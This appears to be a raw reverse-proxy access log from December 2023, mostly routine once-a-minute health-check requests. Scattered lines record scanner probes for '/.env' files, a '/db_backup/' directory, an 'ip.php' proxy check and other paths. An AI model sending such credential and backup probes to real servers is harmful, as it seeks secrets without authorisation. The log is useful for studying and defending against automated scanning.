185.100.87.136 - - [18/Dec/2023:08:10:58 +0000] "POST /FD873AC4-CF86-4FED-84EC-4BD59C6F17A7 HTTP/1.1" 404 19 "-" "-" 4470 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:08:11:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4471 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:08:11:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4472 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:08:12:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4473 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:12:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4474 "www@docker" "http://172.18.0.9:80" 0ms
90.151.171.106 - - [18/Dec/2023:08:12:51 +0000] "CONNECT - HTTP/1.1" 308 18 "-" "-" 4475 "web-to-websecure@internal" "-" 0ms
90.151.171.106 - - [18/Dec/2023:08:13:02 +0000] "GET /ip.php?Z78354937572Q1 HTTP/1.1" 301 17 "-" "-" 4476 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:08:13:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4477 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:13:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4478 "www@docker" "http://172.18.0.9:80" 4ms
159.203.109.206 - - [18/Dec/2023:08:14:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4479 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:14:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4480 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:08:15:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4481 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:15:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4482 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:08:16:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4483 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:16:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4484 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [18/Dec/2023:08:16:52 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4485 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:08:17:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4486 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:17:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4487 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:08:18:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4488 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:18:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4489 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:08:19:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4490 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:19:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4491 "www@docker" "http://172.18.0.9:80" 1ms
95.214.235.169 - - [18/Dec/2023:08:20:18 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4492 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [18/Dec/2023:08:20:19 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 4493 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:08:20:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4494 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:20:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4495 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:08:21:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4496 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:21:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4497 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:08:22:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4498 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:22:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4499 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:08:23:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4500 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:23:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4501 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:08:24:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4502 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:24:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4503 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:08:25:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4504 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:25:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4505 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [18/Dec/2023:08:25:39 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4506 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:08:26:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4507 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:26:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4508 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:08:27:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4509 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:27:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4510 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:08:28:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4511 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:28:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4512 "www@docker" "http://172.18.0.9:80" 0ms
35.244.84.66 - - [18/Dec/2023:08:29:17 +0000] "OPTIONS / HTTP/1.0" 404 19 "-" "-" 4513 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:08:29:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4514 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:08:29:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4515 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:08:30:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4516 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:30:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4517 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:08:31:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4518 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:31:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4519 "www@docker" "http://172.18.0.9:80" 0ms
185.224.128.142 - - [18/Dec/2023:08:32:10 +0000] "GET /db_backup/ HTTP/1.1" 404 19 "-" "-" 4520 "-" "-" 0ms
185.224.128.142 - - [18/Dec/2023:08:32:10 +0000] "GET /db_backup/ HTTP/1.1" 301 17 "-" "-" 4521 "web-to-websecure@internal" "-" 0ms
185.224.128.142 - - [18/Dec/2023:08:32:10 +0000] "GET /db_backup/ HTTP/1.1" 404 19 "-" "-" 4522 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:08:32:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4523 "www@docker" "http://172.18.0.9:80" 0ms
128.14.209.42 - - [18/Dec/2023:08:32:24 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4524 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:08:32:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4525 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:08:33:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4526 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:33:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4527 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:08:34:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4528 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:34:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4529 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:08:35:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4530 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:35:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4531 "www@docker" "http://172.18.0.9:80" 0ms
104.199.35.68 - - [18/Dec/2023:08:36:16 +0000] "OPTIONS / HTTP/1.0" 404 19 "-" "-" 4532 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:08:36:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4533 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:36:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4534 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:08:37:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4535 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:08:37:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4536 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:08:38:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4537 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:08:38:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4538 "www@docker" "http://172.18.0.9:80" 0ms
185.224.128.142 - - [18/Dec/2023:08:39:01 +0000] "GET /db_backup/ HTTP/1.1" 404 19 "-" "-" 4539 "-" "-" 0ms
185.224.128.142 - - [18/Dec/2023:08:39:01 +0000] "GET /db_backup/ HTTP/1.1" 301 17 "-" "-" 4540 "web-to-websecure@internal" "-" 0ms
185.224.128.142 - - [18/Dec/2023:08:39:02 +0000] "GET /db_backup/ HTTP/1.1" 404 19 "-" "-" 4541 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:08:39:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4542 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:39:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4543 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:08:40:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4544 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:40:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4545 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:08:41:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4546 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:08:41:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4547 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:08:42:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4548 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:42:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4549 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:08:43:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4550 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:43:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4551 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:08:44:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4552 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4553 "www@docker" "http://172.18.0.9:80" 0ms
95.214.235.169 - - [18/Dec/2023:08:45:17 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4554 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [18/Dec/2023:08:45:19 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 4555 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:08:45:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4556 "www@docker" "http://172.18.0.9:80" 0ms
71.6.232.25 - - [18/Dec/2023:08:45:23 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4557 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [18/Dec/2023:08:45:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4558 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:08:46:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4559 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:08:46:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4560 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:08:47:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4561 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:08:47:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4562 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:08:48:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4563 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:48:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4564 "www@docker" "http://172.18.0.9:80" 1ms
68.69.186.30 - - [18/Dec/2023:08:49:00 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4565 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:08:49:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4566 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:49:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4567 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:08:50:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4568 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:50:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4569 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:08:51:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4570 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:51:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4571 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:08:52:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4572 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:08:52:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4573 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:08:53:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4574 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:53:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4575 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:08:54:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4576 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:54:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4577 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:08:55:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4578 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:55:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4579 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:08:56:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4580 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:56:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4581 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:08:57:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4582 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4583 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:08:58:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4584 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:58:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4585 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:08:59:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4586 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:59:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4587 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [18/Dec/2023:09:00:01 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4588 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:09:00:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4589 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:00:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4590 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:09:01:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4591 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4592 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:09:02:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4593 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:09:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4594 "www@docker" "http://172.18.0.9:80" 0ms
54.37.79.75 - - [18/Dec/2023:09:03:09 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4595 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [18/Dec/2023:09:03:09 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 4596 "web-to-websecure@internal" "-" 0ms
143.110.222.166 - - [18/Dec/2023:09:03:19 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4597 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:09:03:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4598 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:03:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4599 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:09:04:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4600 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:04:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4601 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:09:05:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4602 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:05:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4603 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:09:06:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4604 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:06:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4605 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:09:07:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4606 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:07:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4607 "www@docker" "http://172.18.0.9:80" 0ms
185.134.22.149 - - [18/Dec/2023:09:08:13 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4608 "-" "-" 0ms
185.134.22.149 - - [18/Dec/2023:09:08:15 +0000] "GET /Ep1v HTTP/1.1" 404 19 "-" "-" 4609 "-" "-" 0ms
185.134.22.149 - - [18/Dec/2023:09:08:16 +0000] "GET /GWqN HTTP/1.1" 404 19 "-" "-" 4610 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:09:08:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4611 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:08:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4612 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:09:09:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4613 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:09:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4614 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:09:10:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4615 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:09:10:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4616 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:09:11:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4617 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:11:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4618 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:09:12:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4619 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:12:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4620 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:09:13:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4621 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:09:13:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4622 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:09:14:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4623 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:14:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4624 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:09:15:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4625 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:15:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4626 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:09:16:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4627 "www@docker" "http://172.18.0.9:80" 0ms
36.90.20.23 - - [18/Dec/2023:09:16:30 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4628 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [18/Dec/2023:09:16:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4629 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:09:17:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4630 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:17:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4631 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:09:18:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4632 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:18:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4633 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:09:19:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4634 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:19:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4635 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:09:20:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4636 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:09:20:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4637 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:09:21:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4638 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:21:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4639 "www@docker" "http://172.18.0.9:80" 1ms
185.100.87.136 - - [18/Dec/2023:09:22:05 +0000] "POST /FD873AC4-CF86-4FED-84EC-4BD59C6F17A7 HTTP/1.1" 404 19 "-" "-" 4640 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:09:22:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4641 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:22:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4642 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:09:23:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4643 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:23:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4644 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:09:24:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4645 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:24:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4646 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:09:25:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4647 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:09:25:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4648 "www@docker" "http://172.18.0.9:80" 2ms
159.203.109.206 - - [18/Dec/2023:09:26:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4649 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:09:26:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4650 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:09:27:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4651 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:27:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4652 "www@docker" "http://172.18.0.9:80" 1ms
